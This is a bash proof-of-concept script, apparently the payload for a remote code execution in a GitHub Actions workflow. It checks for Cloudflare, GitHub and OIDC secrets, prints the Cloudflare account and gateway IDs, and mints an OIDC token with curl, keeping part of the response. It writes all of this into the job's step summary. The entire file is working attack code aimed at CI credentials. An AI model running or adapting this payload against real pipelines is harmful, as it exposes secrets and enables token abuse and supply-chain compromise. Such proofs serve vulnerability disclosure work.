#!/usr/bin/env bash
{
  echo "POC_RCE_EXECUTED time=$(date -u +%FT%TZ) user=$(id -un) pwd=$(pwd)"
  echo "POC_CF_TOKEN_PRESENT=$([ -n "${CLOUDFLARE_API_TOKEN:-}" ] && echo YES || echo no) len=${#CLOUDFLARE_API_TOKEN}"
  echo "POC_CF_ACCOUNT_ID=${CLOUDFLARE_ACCOUNT_ID:-<empty>}"
  echo "POC_CF_GATEWAY=${CLOUDFLARE_GATEWAY_ID:-<empty>}"
  echo "POC_OIDC_REQUEST_TOKEN_PRESENT=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ] && echo YES || echo no)"
  echo "POC_OIDC_REQUEST_URL_PRESENT=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo YES || echo no)"
  echo "POC_GH_TOKEN_PRESENT=$([ -n "${GH_TOKEN:-}" ] && echo YES || echo no)"
  echo "POC_OIDC_MINT_RESPONSE=$(curl -s --max-time 10 -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-none}" "${ACTIONS_ID_TOKEN_REQUEST_URL:-http://127.0.0.1:1}&audience=poc" | head -c 60)"
} > /tmp/poc-proof.txt 2>&1
cp /tmp/poc-proof.txt "${GITHUB_STEP_SUMMARY:-/dev/null}" 2>/dev/null || true
exit 0
